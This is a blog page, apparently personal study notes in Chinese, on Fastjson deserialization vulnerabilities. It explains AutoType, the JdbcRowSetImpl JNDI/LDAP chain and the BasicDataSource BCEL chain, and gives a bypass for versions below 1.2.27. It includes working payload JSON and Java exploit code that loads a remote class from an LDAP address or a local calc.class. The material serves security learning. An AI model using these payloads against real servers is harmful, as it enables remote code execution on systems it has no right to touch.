@@ -1,0 +1,722 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Fastjson反序列化1.什么是FastjsonFastjson是阿里开发的一个java的json库 2.fastjson反序列化漏洞由于引进了AutoType功能，fastjson在对json字符串反序列化的时候，会读取到@type的内容，将json内容反序列化为java对象并调用这个类的set方法 3.引入AutoType的原因：Fastjson通过parseObject&#x2F;pars">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson">
+<meta property="og:url" content="https://ggji13123.github.io/2024/08/28/fastjson/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Fastjson反序列化1.什么是FastjsonFastjson是阿里开发的一个java的json库 2.fastjson反序列化漏洞由于引进了AutoType功能，fastjson在对json字符串反序列化的时候，会读取到@type的内容，将json内容反序列化为java对象并调用这个类的set方法 3.引入AutoType的原因：Fastjson通过parseObject&#x2F;pars">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ggji13123.github.io/image/fastjson/image-20240501214415921.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/fastjson/image-20240501155432443.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/fastjson/image-20240501160610053.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/fastjson/image-20240501162245005.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/fastjson/image-20240513091645072.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/fastjson/image-20240501210914768.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/fastjson/image-20240501212249403.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/fastjson/image-20240501212959029.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/fastjson/image-20240501213015565.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/fastjson/image-20240501213944334.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/fastjson/image-20240501214119140.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/fastjson/image-20240513093445313.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/fastjson/image-20240513100617020.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/fastjson/image-20240513101016326.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/fastjson/image-20240513101437727.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/fastjson/image-20240513101729050.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/fastjson/image-20240513103021808.png">
+<meta property="og:image" content="https://ggji13123.github.io/image/fastjson/image-20240513104756962.png">
+<meta property="article:published_time" content="2024-08-28T03:33:19.000Z">
+<meta property="article:modified_time" content="2024-08-28T03:34:07.083Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ggji13123.github.io/image/fastjson/image-20240501214415921.png">
+  
+  
+  
+  <title>fastjson - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ggji13123.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="fastjson"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-28 11:33" pubdate>
+          2024年8月28日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          16 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">fastjson</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="Fastjson反序列化"><a href="#Fastjson反序列化" class="headerlink" title="Fastjson反序列化"></a>Fastjson反序列化</h2><h4 id="1-什么是Fastjson"><a href="#1-什么是Fastjson" class="headerlink" title="1.什么是Fastjson"></a>1.什么是Fastjson</h4><p>Fastjson是阿里开发的一个java的json库</p>
+<h4 id="2-fastjson反序列化漏洞"><a href="#2-fastjson反序列化漏洞" class="headerlink" title="2.fastjson反序列化漏洞"></a>2.fastjson反序列化漏洞</h4><p>由于引进了<strong>AutoType</strong>功能，fastjson在对json字符串反序列化的时候，会读取到@type的内容，将json内容反序列化为java对象并调用这个类的set方法</p>
+<h4 id="3-引入AutoType的原因："><a href="#3-引入AutoType的原因：" class="headerlink" title="3.引入AutoType的原因："></a>3.引入AutoType的原因：</h4><p>Fastjson通过parseObject&#x2F;parse将传入的字符串反序列化为Java对象</p>
+<p>对于json来说，实现序列化（将Java对象转换成字符串）有两种方式</p>
+<p>一种是基于getter和setter方法，但是此方法会出现当两个子类同时继承至一个接口时，在对象进行序列化会自动抹除子类，导致在反序列化时无法区分子类，只保留接口的类型</p>
+<p>为了更好理解给出以下例子：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs perl">假设有以下两个类<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Apple</span> <span class="hljs-title">implements</span> <span class="hljs-title">Fruit</span> </span>&#123;<br>    private Big_Decimal price;<br>  <br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">iphone</span> <span class="hljs-title">implements</span> <span class="hljs-title">Fruit</span> </span>&#123;<br>    private Big_Decimal price;<br> <br>&#125;<br><br>实例化对象之后，假设苹果对象的price为<span class="hljs-number">0</span>.<span class="hljs-number">5</span>，Apple类对象序列化为json格式后为：<br><br>&#123;<span class="hljs-string">&quot;Fruit&quot;</span>:&#123;<span class="hljs-string">&quot;price&quot;</span>:<span class="hljs-number">0</span>.<span class="hljs-number">5</span>&#125;&#125;<br><br>假设iphone对象的price为<span class="hljs-number">5000</span>,序列化为json格式后为：<br><br>&#123;<span class="hljs-string">&quot;Fruit&quot;</span>:&#123;<span class="hljs-string">&quot;price&quot;</span>:<span class="hljs-number">5000</span>&#125;&#125;<br><br>将这个类的对象序列化的时候，就会将子类抹去（apple/iphone）只保留接口的类型(Fruit)，最后导致反序列化时无法得到原始类型。本例中，将两个json再反序列化生成java对象的时候，无法区分原始类是apple还是iphone<br></code></pre></td></tr></table></figure>
+
+<p>所以为了解决上面的问题引入第二种方式</p>
+<p>AutoType</p>
+<p>AutoType在序列化时会将原始子类用<code>@type</code>的方式保存下来，例如上面的例子在进行序列化时就会保存为</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123; <span class="hljs-string">&quot;fruit&quot;</span>:&#123; <span class="hljs-string">&quot;<span class="hljs-variable">@type</span>&quot;</span>:<span class="hljs-string">&quot;com.hollis.lab.fastjson.test.Apple&quot;</span>, <span class="hljs-string">&quot;price&quot;</span>:<span class="hljs-number">0</span>.<span class="hljs-number">5</span> &#125; &#125;<br>和<br>&#123;<span class="hljs-string">&quot;fruit&quot;</span>:&#123;<span class="hljs-string">&quot;<span class="hljs-variable">@type</span>&quot;</span>:<span class="hljs-string">&quot;com.hollis.lab.fastjsn.test.iphone&quot;</span>, <span class="hljs-string">&quot;price&quot;</span>:<span class="hljs-number">5000</span>&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这样就可以使得反序列化时保持原始类</p>
+<h4 id="4-fastjson反序列化漏洞成因"><a href="#4-fastjson反序列化漏洞成因" class="headerlink" title="4.fastjson反序列化漏洞成因"></a>4.fastjson反序列化漏洞成因</h4><p>按照上面的说法，@type在反序列化时会自动的加载类，并且自动的去调用setter和getter方法，所以我们可以指定的去加载一些恶意类</p>
+<p>比较常见的是<strong>om.sun.rowset.JdbcRowSetImpl，其中有个dataSourceName方法支持传入一个rmi的源，只要解析其中的url就会支持远程调用</strong>,我们可以利用这个方法进行远程恶意类的加载</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">构造以下<span class="hljs-type">json</span><br>&#123;<br>    &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,<br>    &quot;DataSourceName&quot;: &quot;ldap://127.0.0.1:8085/JGLkuUyN&quot;,<br>    &quot;autoCommit&quot;: <span class="hljs-keyword">false</span><br>&#125;<br>这个<span class="hljs-type">json</span>会利用@<span class="hljs-keyword">type</span>自动调用setter的行为将DataSourceName传进去并反序列化成一个对象<br>这个对象则会利用ldap协议进行远程加载我们的恶意类<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="fastjson反序列化和原生反序列化的区别"><a href="#fastjson反序列化和原生反序列化的区别" class="headerlink" title="fastjson反序列化和原生反序列化的区别"></a>fastjson反序列化和原生反序列化的区别</h2><p>不同：</p>
+<p>1、不需要实现Serializable接口</p>
+<p>2、 变量不需要不是transient，只需要变量有对应的setter方法或者是public或者是满足条件的getter</p>
+<p>get条件如下图，即需要返回值为<code>Collection,Map,boolean,int,long</code>这几类才可以利用</p>
+<p><img src="/image/fastjson/image-20240501214415921.png" srcset="/img/loading.gif" lazyload alt="image-20240501214415921"> </p>
+<p>3、突破口是setter&#x2F;getter，而不是readObject</p>
+<p>相同点是都是通过反射或者动态类加载来进行</p>
+<hr>
+<h3 id="JdbcRowSetImpl分析"><a href="#JdbcRowSetImpl分析" class="headerlink" title="JdbcRowSetImpl分析"></a>JdbcRowSetImpl分析</h3><p>这条链利用jndi进行远程类加载，实现命令执行</p>
+<p><code>jdbcRowSetImpl</code>这个类中在<code>connect</code>方法里存在一处<code>jndi</code>注入,这里我们需要找的可控变量为<code>DataSourceName</code></p>
+<p><img src="/image/fastjson/image-20240501155432443.png" srcset="/img/loading.gif" lazyload alt="image-20240501155432443"> </p>
+<p>上面提到，在<code>fastjson</code>中可控变量需要是有setter方法的变量或者public又或者有对应返回类型的getter方法</p>
+<p>很明显这里的<code>DataSourceName</code>满足有setter的要求</p>
+<p><img src="/image/fastjson/image-20240501160610053.png" srcset="/img/loading.gif" lazyload alt="image-20240501160610053"> </p>
+<p>接下来就是跟以往一样找到调用connect方法的位置，这里选择的是<code>setAutoCommit</code></p>
+<p><img src="/image/fastjson/image-20240501162245005.png" srcset="/img/loading.gif" lazyload alt="image-20240501162245005"> </p>
+<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span>  com.alibaba.fastjson.*;<br><br><span class="hljs-keyword">import</span> javax.sql.rowset.JdbcRowSet;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-type">String</span>[] args) <span class="hljs-keyword">throws</span> <span class="hljs-type">Exception</span>&#123;<br><br>        <span class="hljs-type">String</span> payload <span class="hljs-operator">=</span>   <span class="hljs-string">&quot;&#123;<span class="hljs-subst">\&quot;</span>@type<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>com.sun.rowset.JdbcRowSetImpl<span class="hljs-subst">\&quot;</span>,<span class="hljs-subst">\&quot;</span>DataSourceName<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>ldap://127.0.0.1:8888/PZJEfwjm<span class="hljs-subst">\&quot;</span>,<span class="hljs-subst">\&quot;</span>autoCommit<span class="hljs-subst">\&quot;</span>:false&#125;&quot;</span>;<br>        <span class="hljs-type">JSON</span>.parseObject(payload);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里利用@type，调用<code>JdbcRowSetImpl</code>，并且会自动去调用<code>setDataSourceName</code>和<code>setautoCommit</code></p>
+<p>最终使得<code>DataSourceName</code>赋值为<code>ldap://127.0.0.1:8888/PZJEfwjm</code>这个恶意代码，</p>
+<p><code>setAutoCommit</code>中会走到<code>connect</code>,<code>connect</code>中进行jndi注入</p>
+<h4 id="流程如下"><a href="#流程如下" class="headerlink" title="流程如下"></a>流程如下</h4><p><img src="/image/fastjson/image-20240513091645072.png" srcset="/img/loading.gif" lazyload alt="image-20240513091645072"> </p>
+<hr>
+<h4 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h4><p>因为是本质上是jndi注入，所以必须出网且受版本限制，依赖限制</p>
+<hr>
+<h3 id="BasicDatasource分析"><a href="#BasicDatasource分析" class="headerlink" title="BasicDatasource分析"></a>BasicDatasource分析</h3><h4 id="调用链分析"><a href="#调用链分析" class="headerlink" title="调用链分析"></a>调用链分析</h4><p>这一条利用链使用的执行方法是动态类加载，因此可以不出网，但是需要有tomcat</p>
+<p>需要的类为<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code></p>
+<p>在这个<code>ClassLoader.loadClass</code>中，当类名为<code>$$BCEL$$</code>时，就会创建一个新的类，再使用<code>defineClass</code>进行动态类加载</p>
+<p><img src="/image/fastjson/image-20240501210914768.png" srcset="/img/loading.gif" lazyload alt="image-20240501210914768"> </p>
+<p>所以接下来要寻找调用<code>ClassLoader.loadClass</code>的方式</p>
+<p>这里我们就需要使用<code>tomcat</code>中的<code>BasicDatasource</code></p>
+<p>如下图，在<code>createConnectionFactory</code>中，当<code>driverClassLoader</code>不为空时，就会使用<code>driverClassLoader</code>加载<code>driverClassName</code>，所以我们需要控制<code>driverClassLoader</code>为上面提到的<code>ClassLoader.loadClass</code>，<code>driverClassName</code>控制为<code>$$BCEK$$</code></p>
+<p><img src="/image/fastjson/image-20240501212249403.png" srcset="/img/loading.gif" lazyload alt="image-20240501212249403"> </p>
+<p>而正好这两个值都有他们自己的setter方法，可以在fastjson中利用</p>
+<p><img src="/image/fastjson/image-20240501212959029.png" srcset="/img/loading.gif" lazyload alt="image-20240501212959029"> <img src="/image/fastjson/image-20240501213015565.png" srcset="/img/loading.gif" lazyload alt="image-20240501213015565"> </p>
+<p>接下来找的就是找到调用<code>createConnectionFactory</code>的get或者set方法</p>
+<p>最终在这个类中找到了<code>getConnection</code>调用了<code>createDataSource</code>，<code>createDataSource</code>最终调用了<code>createConnectionFactory</code></p>
+<p>并且他的返回值正好是<code>Collection</code>,符合fastjson的利用条件</p>
+<p><img src="/image/fastjson/image-20240501213944334.png" srcset="/img/loading.gif" lazyload alt="image-20240501213944334"> </p>
+<p><img src="/image/fastjson/image-20240501214119140.png" srcset="/img/loading.gif" lazyload alt="image-20240501214119140"> </p>
+<p>利用代码如下</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell">        ClassLoader classLoader = new ClassLoader();<br>        byte[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\40148\\Desktop\\笔记\\fastjson\\calc.class&quot;</span>));<br>        String code = Utility.encode(bytes, true);<br>//        classLoader.loadClass(<span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$BCEL</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&quot;</span> + code).newInstance();<br>        BasicDataSource basicDataSource = new BasicDataSource();<br>        basicDataSource.setDriverClassName(<span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$BCEL</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&quot;</span> + code);<br>        basicDataSource.setDriverClassLoader(classLoader);<br>        basicDataSource.getConnection();<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="fastjson利用"><a href="#fastjson利用" class="headerlink" title="fastjson利用"></a>fastjson利用</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\40148\\Desktop\\笔记\\fastjson\\calc.class&quot;</span>));<br><span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(bytes, <span class="hljs-literal">true</span>);<br>String s=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;DriverClassName\&quot;:\&quot;$$BCEL$$&quot;</span>+code+<span class="hljs-string">&quot;\&quot;,\&quot;DriverClassLoader\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;&#125;&quot;</span>;<br>JSON.parseObject(s);<br><br></code></pre></td></tr></table></figure>
+
+<p>这里我们并不需要传入<code>getConnection</code>,因为fastjson在反序列化过程中会自动的调用所有符合条件的get方法</p>
+<h4 id="流程如下-1"><a href="#流程如下-1" class="headerlink" title="流程如下"></a>流程如下</h4><p><img src="/image/fastjson/image-20240513093445313.png" srcset="/img/loading.gif" lazyload alt="image-20240513093445313"></p>
+<h3 id="Templatesimpl"><a href="#Templatesimpl" class="headerlink" title="Templatesimpl"></a>Templatesimpl</h3><h2 id="fastjson-修复绕过"><a href="#fastjson-修复绕过" class="headerlink" title="fastjson 修复绕过"></a>fastjson 修复绕过</h2><p><strong>版本&lt;1.2.27</strong></p>
+<p>在这个版本修复中，当检测到<code>@type</code>关键字后，就会走到一个新函数<code>checkAutoType</code>中</p>
+<p><img src="/image/fastjson/image-20240513100617020.png" srcset="/img/loading.gif" lazyload alt="image-20240513100617020"> </p>
+<p>在<code>getClassFromMapping</code>这个方法中，会优先从缓存里面去找类，如果缓存中存在，会直接返回不进行类型检查</p>
+<p><img src="/image/fastjson/image-20240513101016326.png" srcset="/img/loading.gif" lazyload alt="image-20240513101016326"> </p>
+<p>所以就需要找到如何将我们的恶意类写入缓存中</p>
+<p>进入<code>getClassFromMapping</code>中，缓存是从mapping中获得，找到为mapping put值的地方</p>
+<p><img src="/image/fastjson/image-20240513101437727.png" srcset="/img/loading.gif" lazyload alt="image-20240513101437727"> </p>
+<p>有两处，第一处是在<code>addBaseClassMappings</code>但是这是用于加入基础类的地方，无法控制</p>
+<p>第二处是在<code>loadClass</code></p>
+<p><img src="/image/fastjson/image-20240513101729050.png" srcset="/img/loading.gif" lazyload alt="image-20240513101729050"> </p>
+<p>接下来寻找loadclass调用处，看看是否能够控制</p>
+<p>查找调用处，找到一个<code>MiscCodec.deserialze</code>中会调用这个loadClass</p>
+<p><img src="/image/fastjson/image-20240513103021808.png" srcset="/img/loading.gif" lazyload alt="image-20240513103021808"> </p>
+<p>而MiscCodec这个类是一个反序列化器，查看反序列化器定义处，发现Class使用的是MiscCodec这个反序列化器</p>
+<p>，所以我们可以在fastjson中反序列化一个Class，就会走到MiscCodec中</p>
+<p><img src="/image/fastjson/image-20240513104756962.png" srcset="/img/loading.gif" lazyload alt="image-20240513104756962"> </p>
+<h4 id="完整payload"><a href="#完整payload" class="headerlink" title="完整payload"></a>完整payload</h4><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-type">String</span>[] args) <span class="hljs-keyword">throws</span> <span class="hljs-type">Exception</span>&#123;<br><br>   <span class="hljs-comment">//加载一个类，值为恶意类,并顺势进行反序列化</span><br>    <span class="hljs-type">String</span> payload<span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&#123;<span class="hljs-subst">\&quot;</span>@type<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>java.lang.Class<span class="hljs-subst">\&quot;</span>,<span class="hljs-subst">\&quot;</span>val<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>com.sun.rowset.JdbcRowSetImpl<span class="hljs-subst">\&quot;</span>&#125;,&#123;<span class="hljs-subst">\&quot;</span>@type<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>com.sun.rowset.JdbcRowSetImpl<span class="hljs-subst">\&quot;</span>,<span class="hljs-subst">\&quot;</span>DataSourceName<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>ldap://127.0.0.1:8085/LVDvOfkO<span class="hljs-subst">\&quot;</span>,<span class="hljs-subst">\&quot;</span>autocommit<span class="hljs-subst">\&quot;</span>:true&#125;&#125;&quot;</span>;<br>    <span class="hljs-type">JSON</span>.parseObject(payload);<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="修复绕过总结"><a href="#修复绕过总结" class="headerlink" title="修复绕过总结"></a>修复绕过总结</h4><p>只需要将我们需要的恶意类在进行反序列化前，加载到缓存中去，这样就可以绕过后续反序列化过程中的校验</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>fastjson</div>
+      <div>https://ggji13123.github.io/2024/08/28/fastjson/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年8月28日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/08/28/cc%E9%93%BE/" title="CC链">
+                        <span class="hidden-mobile">CC链</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
